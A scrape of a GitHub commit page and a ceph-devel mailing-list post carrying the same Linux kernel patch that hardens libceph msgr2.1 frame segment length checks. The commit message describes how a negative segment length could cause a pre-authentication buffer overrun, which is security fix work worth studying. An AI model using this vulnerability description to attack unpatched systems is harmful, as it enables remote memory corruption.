|  |  | middle\_len < 0 || middle\_len > CEPH\_MSG\_MAX\_MIDDLE\_LEN || |
|  |  | data\_len < 0 || data\_len > CEPH\_MSG\_MAX\_DATA\_LEN); |
|  |  |  |
|  |  | if (!front\_len && !middle\_len && !data\_len) |
|  |  | return 0; |
|  |  |  |
| Expand Down  Expand Up | | @@ -520,29 +526,34 @@ static int decode\_preamble(void \*p, struct ceph\_frame\_desc \*desc) |
|  |  | desc->fd\_aligns[i] = ceph\_decode\_16(&p); |
|  |  | } |
|  |  |  |
|  |  | /\* |
|  |  | \* This would fire for FRAME\_TAG\_WAIT (it has one empty |
|  |  | \* segment), but we should never get it as client. |
|  |  | \*/ |
|  |  | if (!desc->fd\_lens[desc->fd\_seg\_cnt - 1]) { |
|  |  | pr\_err("last segment empty\n"); |
|  |  | if (desc->fd\_lens[0] < 0 || |
|  |  | desc->fd\_lens[0] > CEPH\_MSG\_MAX\_CONTROL\_LEN) { |
|  |  | pr\_err("bad control segment length %d\n", desc->fd\_lens[0]); |
|  |  | return -EINVAL; |
|  |  | } |
|  |  |  |
|  |  | if (desc->fd\_lens[0] > CEPH\_MSG\_MAX\_CONTROL\_LEN) { |
|  |  | pr\_err("control segment too big %d\n", desc->fd\_lens[0]); |
|  |  | if (desc->fd\_lens[1] < 0 || |
|  |  | desc->fd\_lens[1] > CEPH\_MSG\_MAX\_FRONT\_LEN) { |
|  |  | pr\_err("bad front segment length %d\n", desc->fd\_lens[1]); |
|  |  | return -EINVAL; |
|  |  | } |
|  |  | if (desc->fd\_lens[1] > CEPH\_MSG\_MAX\_FRONT\_LEN) { |
|  |  | pr\_err("front segment too big %d\n", desc->fd\_lens[1]); |
|  |  | if (desc->fd\_lens[2] < 0 || |
|  |  | desc->fd\_lens[2] > CEPH\_MSG\_MAX\_MIDDLE\_LEN) { |
|  |  | pr\_err("bad middle segment length %d\n", desc->fd\_lens[2]); |
|  |  | return -EINVAL; |
|  |  | } |
|  |  | if (desc->fd\_lens[2] > CEPH\_MSG\_MAX\_MIDDLE\_LEN) { |
|  |  | pr\_err("middle segment too big %d\n", desc->fd\_lens[2]); |
|  |  | if (desc->fd\_lens[3] < 0 || |
|  |  | desc->fd\_lens[3] > CEPH\_MSG\_MAX\_DATA\_LEN) { |
|  |  | pr\_err("bad data segment length %d\n", desc->fd\_lens[3]); |
|  |  | return -EINVAL; |
|  |  | } |
|  |  | if (desc->fd\_lens[3] > CEPH\_MSG\_MAX\_DATA\_LEN) { |
|  |  | pr\_err("data segment too big %d\n", desc->fd\_lens[3]); |
|  |  |  |
|  |  | /\* |
|  |  | \* This would fire for FRAME\_TAG\_WAIT (it has one empty |
|  |  | \* segment), but we should never get it as client. |
|  |  | \*/ |
|  |  | if (!desc->fd\_lens[desc->fd\_seg\_cnt - 1]) { |
|  |  | pr\_err("last segment empty, segment count %d\n", |
|  |  | desc->fd\_seg\_cnt); |
|  |  | return -EINVAL; |
|  |  | } |
|  |  |  |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `a282a2f`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2Fa282a2f10539dce2aa619e71e1817570d557fc97) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.spinics.net_834b0090_20250114_185129.html ===


# [PATCH] libceph: harden msgr2.1 frame segment length checks

[[Date Prev](msg57908.html)][[Date Next](msg57910.html)][[Thread Prev](msg57898.html)][[Thread Next](msg57910.html)][[Date Index](maillist.html#57909)][[Thread Index](index.html#57909)]

---

* *To*: ceph-devel@xxxxxxxxxxxxxxx
* *Subject*: [PATCH] libceph: harden msgr2.1 frame segment length checks
* *From*: Ilya Dryomov <idryomov@xxxxxxxxx>
* *Date*: Wed, 12 Jul 2023 14:07:15 +0200
* *Cc*: Thelford Williams <thelford@xxxxxxxxxx>

---

```
ceph_frame_desc::fd_lens is an int array.  decode_preamble() thus
effectively casts u32 -> int but the checks for segment lengths are
written as if on unsigned values.  While reading in HELLO or one of the
AUTH frames (before authentication is completed), arithmetic in
head_onwire_len() can get duped by negative ctrl_len and produce
head_len which is less than CEPH_PREAMBLE_LEN but still positive.
This would lead to a buffer overrun in prepare_read_control() as the
preamble gets copied to the newly allocated buffer of size head_len.

Cc: stable@xxxxxxxxxxxxxxx
Fixes: cd1a677cad99 ("libceph, ceph: implement msgr2.1 protocol (crc and secure modes)")
Reported-by: Thelford Williams <thelford@xxxxxxxxxx>
Signed-off-by: Ilya Dryomov <idryomov@xxxxxxxxx>
---
 net/ceph/messenger_v2.c | 41 ++++++++++++++++++++++++++---------------
 1 file changed, 26 insertions(+), 15 deletions(-)

diff --git a/net/ceph/messenger_v2.c b/net/ceph/messenger_v2.c
index 1a888b86a494..1df1d29dee92 100644
--- a/net/ceph/messenger_v2.c
+++ b/net/ceph/messenger_v2.c
@@ -390,6 +390,8 @@ static int head_onwire_len(int ctrl_len, bool secure)
 	int head_len;
 	int rem_len;

+	BUG_ON(ctrl_len < 0 || ctrl_len > CEPH_MSG_MAX_CONTROL_LEN);
+
 	if (secure) {
 		head_len = CEPH_PREAMBLE_SECURE_LEN;
 		if (ctrl_len > CEPH_PREAMBLE_INLINE_LEN) {
@@ -408,6 +410,10 @@ static int head_onwire_len(int ctrl_len, bool secure)
 static int __tail_onwire_len(int front_len, int middle_len, int data_len,
 			     bool secure)
 {
+	BUG_ON(front_len < 0 || front_len > CEPH_MSG_MAX_FRONT_LEN ||
+	       middle_len < 0 || middle_len > CEPH_MSG_MAX_MIDDLE_LEN ||
+	       data_len < 0 || data_len > CEPH_MSG_MAX_DATA_LEN);
+
 	if (!front_len && !middle_len && !data_len)
 		return 0;

@@ -520,29 +526,34 @@ static int decode_preamble(void *p, struct ceph_frame_desc *desc)
 		desc->fd_aligns[i] = ceph_decode_16(&p);
 	}

-	/*
-	 * This would fire for FRAME_TAG_WAIT (it has one empty
-	 * segment), but we should never get it as client.
-	 */
-	if (!desc->fd_lens[desc->fd_seg_cnt - 1]) {
-		pr_err("last segment empty\n");
+	if (desc->fd_lens[0] < 0 ||
+	    desc->fd_lens[0] > CEPH_MSG_MAX_CONTROL_LEN) {
+		pr_err("bad control segment length %d\n", desc->fd_lens[0]);
 		return -EINVAL;
 	}
-
-	if (desc->fd_lens[0] > CEPH_MSG_MAX_CONTROL_LEN) {
-		pr_err("control segment too big %d\n", desc->fd_lens[0]);
+	if (desc->fd_lens[1] < 0 ||
+	    desc->fd_lens[1] > CEPH_MSG_MAX_FRONT_LEN) {
+		pr_err("bad front segment length %d\n", desc->fd_lens[1]);
 		return -EINVAL;
 	}
-	if (desc->fd_lens[1] > CEPH_MSG_MAX_FRONT_LEN) {
-		pr_err("front segment too big %d\n", desc->fd_lens[1]);
+	if (desc->fd_lens[2] < 0 ||
+	    desc->fd_lens[2] > CEPH_MSG_MAX_MIDDLE_LEN) {
+		pr_err("bad middle segment length %d\n", desc->fd_lens[2]);
 		return -EINVAL;
 	}
-	if (desc->fd_lens[2] > CEPH_MSG_MAX_MIDDLE_LEN) {
-		pr_err("middle segment too big %d\n", desc->fd_lens[2]);
+	if (desc->fd_lens[3] < 0 ||
+	    desc->fd_lens[3] > CEPH_MSG_MAX_DATA_LEN) {
+		pr_err("bad data segment length %d\n", desc->fd_lens[3]);
 		return -EINVAL;
 	}
-	if (desc->fd_lens[3] > CEPH_MSG_MAX_DATA_LEN) {
-		pr_err("data segment too big %d\n", desc->fd_lens[3]);
+
+	/*
+	 * This would fire for FRAME_TAG_WAIT (it has one empty
+	 * segment), but we should never get it as client.
+	 */
+	if (!desc->fd_lens[desc->fd_seg_cnt - 1]) {
+		pr_err("last segment empty, segment count %d\n",
+		       desc->fd_seg_cnt);
 		return -EINVAL;
 	}

--
2.41.0

```

---

* **Follow-Ups**:
  + **[Re: [PATCH] libceph: harden msgr2.1 frame segment length checks](msg57913.html)**
    - *From:* Xiubo Li
  + **[Re: [PATCH] libceph: harden msgr2.1 frame segment length checks](msg57910.html)**
    - *From:* Alex Elder

* Prev by Date:
  **[Re: [PATCH v2 00/89] fs: new accessors for inode->i\_ctime](msg57908.html)**
* Next by Date:
  **[Re: [PATCH] libceph: harden msgr2.1 frame segment length checks](msg57910.html)**
* Previous by thread:
  **[[GIT PULL] Ceph fixes for 6.5-rc1](msg57898.html)**
* Next by thread:
  **[Re: [PATCH] libceph: harden msgr2.1 frame segment length checks](msg57910.html)**
* Index(es):
  + [**Date**](maillist.html#57909)
  + [**Thread**](index.html#57909)

[[Index of Archives]](/lists/)

[[CEPH Users]](/lists/ceph-users/)

[[Ceph Large]](/lists/ceph-large/)

[[Ceph Dev]](/lists/dev-ceph/)

[[Information on CEPH]](https://en.wikipedia.org/wiki/Ceph)

[[Linux BTRFS]](/lists/linux-btrfs/)

[[Linux USB Devel]](/lists/linux-usb/)

[[Video for Linux]](/lists/linux-media/)

[[Linux Audio Users]](/lists/linux-audio-users/)

[[Yosemite News]](https://yosemitenews.info/)

[[Linux Kernel]](/lists/kernel/)

[[Linux SCSI]](/lists/linux-scsi/)

---

|  | [Powered by Linux](/lists/) |
| --- | --- |


